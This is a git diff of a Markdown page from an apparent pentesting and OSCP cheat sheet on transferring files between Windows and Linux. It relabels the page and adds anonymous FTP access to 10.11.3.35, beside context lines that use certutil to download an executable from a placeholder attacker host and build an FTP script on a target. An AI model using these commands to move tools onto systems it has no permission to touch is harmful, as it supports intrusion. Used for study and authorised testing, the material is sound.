@@ -1,7 +1,7 @@
 ---
 sidebar_position: 2
 title: File Transfer
-description: Linux File Transfer 
+description: Windows - Linux File Transfer 
 keywords: [file transfer, windows file transfer, pentesting, oscp, smb file transfer, powershell file transfer, certutil file transfer, ftp file transfer, tftp file transfer, vbscript file transfer, scp]
 ---
 
@@ -83,6 +83,11 @@ certutil -urlcache -split -f "http://IP:PORT/FILE.exe"
 :: Start The Server
 python3 -m pyftpdlib -p 21
 
+:: Access The Server
+:: [USER: anonymous PASSWORD: anonymous]
+ftp -p 10.11.3.35 21
+
+:: Non Interactive SHELL
 :: Target
 echo open IP > FTP.txt
 echo USER anonymous >> FTP.txt
